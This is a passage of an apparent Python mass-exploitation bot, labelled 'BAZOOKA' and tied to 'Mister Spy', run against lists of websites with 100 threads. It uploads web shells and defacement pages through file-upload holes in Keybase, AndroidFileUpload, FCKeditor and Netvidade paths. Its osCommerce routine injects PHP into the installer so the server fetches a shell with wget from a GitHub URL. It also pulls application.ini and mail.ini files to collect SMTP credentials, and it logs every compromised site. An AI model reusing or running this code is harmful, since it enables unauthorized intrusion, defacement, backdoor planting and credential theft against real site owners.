		req = requests.post(url+'/web/image/upload.php', files=files)

		
		lib = requests.get(url+"/web/image/Images/up.php")

		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in lib.content:
			print '\033[92m[>] \033[0mExploit Keybase \033[92m[Done] '.format(sb, sd, url, fc,fc, sb,fg)
			open('Exploited/shells.txt', 'a').write(url+'/web/image/Images/up.php'+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Keybase  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)
			

		
		files = {'file': (filte, open(filte, 'rb'), 'multipart/form-data')}

		req = requests.post(url+'/AndroidFileUpload/fileUpload.php', files=files)

		
		lib = requests.get(url+"/AndroidFileUpload/uploads/up.php")

		if 'MisterSpyShellForV7Bot0X_istanbul_2019' in lib.content:
			print '\033[92m[>] \033[0mExploit AndroidFile \033[92m[Done] '.format(sb, sd, url, fc,fc, sb,fg)
			open('Exploited/shells.txt', 'a').write(url+'/web/image/Images/up.php'+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit AndroidFile  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)
			
			

		
		files = {'NewFile': (fck, open(fck, 'rb'), 'multipart/form-data')}

		req = requests.post(url+'/fckeditor/editor/filemanager/connectors/php/connector.php?Command=FileUpload&Type=File&CurrentFolder=%2F', files=files)

		
		
		lib = requests.get(url+"/userfiles/file/spy.txt")

		if 'Hacked By Mister Spy' in lib.content:
			print '\033[92m[>] \033[0mExploit FckEditor \033[92m[Done] '.format(sb, sd, url, fc,fc, sb,fg)
			open('Exploited/index.txt', 'a').write(url+'/userfiles/file/spy.txt'+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit FckEditor  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)
			

		
		files = {'NewFile': (fck, open(fck, 'rb'), 'multipart/form-data')}

		req = requests.post(url+'/plugins/fckeditor/editor/filemanager/connectors/php/upload.php', files=files)

		
		
		lib = requests.get(url+"/ficheiros/conteudos/spy.txt")

		if 'Hacked By Mister Spy' in lib.content:
			print '\033[92m[>] \033[0mExploit Netvidade \033[92m[Done] '.format(sb, sd, url, fc,fc, sb,fg)
			open('Exploited/index.txt', 'a').write(url+'/ficheiros/conteudos/spy.txt'+'\n')
			sys.exit()
		else:
			print '\033[92m[>] \033[0mExploit Netvidade  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)
			


	except:
		pass
		
def osrce(url):

    try:
        CheckVuln = requests.get(url + '/install/index.php')
        if 'Welcome to osCommerce' in CheckVuln.text.encode('utf-8') or CheckVuln.status_code == 200:
			Exp = url + '/install/install.php?step=4'
			data = {'DIR_FS_DOCUMENT_ROOT': './'}
			shell = '\');'
			shell += 'system("wget https://raw.githubusercontent.com/MisterSpyx/Mister-Spy-Bot-V4/master/v4rdp/up.php");'
			shell += '/*'
			data['DB_DATABASE'] = shell
			zonn = requests.post(Exp, data=data)
			zox = requests.get(url+'/install/includes/OsComPayLoad.php')
			
			izo = requests.get(url+'/install/includes/up.php')
		
		
			if 'MisterSpyv7up' in izo.content:
				print '\033[92m[>] \033[0mosCommerce   \033[92m[Done] '.format(sb, sd, url, fc,fc, sb,fg)
				open('Exploited/shells.txt', 'a').write(url+'/install/includes/up.php'+'\n')
			else:
				print '\033[92m[>] \033[0mosCommerce   \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)



			
    except:
        pass		
		
		
def zenbot(url):

    try:

		# application
		
		nmxcrevlib = requests.get(url+"/application/configs/application.ini")
				
		if 'Bootstrap' in nmxcrevlib.content:
			print '\033[92m[>] \033[0mConfiguration   \033[92m[Done] '.format(sb, sd, url, fc,fc, sb,fg)
			open('Exploited/ManualConfig.txt', 'a').write(url+'/application/configs/application.ini'+'\n')
		else:
			print '\033[92m[>] \033[0mConfiguration   \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)
			
			
		# application
		
		mmnxcrevlib = requests.get(url+"/application/configs/mail.ini")
				
		if 'smtp' in mmnxcrevlib.content:
			print '\033[92m[>] \033[0mSMTP  \033[92m[done] '.format(sb, sd, url, fc,fc, sb,fg)
			open('Exploited/smtp.txt', 'a').write(url+'/application/configs/mail.ini'+'\n')
		else:
			print '\033[92m[>] \033[0mSMTP  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)



			
    except:
        pass
		
		
def php_str_noquotes(data):
	try:
	
		"Convert string to chr(xx).chr(xx) for use in php"
		encoded = ""
		for char in data:
			encoded += "chr({0}).".format(ord(char))
	  
		return encoded[:-1]
		
	except:
		pass		
		

	
def Main():
    try:
		
        start = timer()
        ThreadPool = Pool(100)
        Threads = ThreadPool.map(cms, sites)
        print('BAZOOKA Finished in : ' + str(timer() - start) + ' seconds')
    except:
        pass


if __name__ == '__main__':
    Main()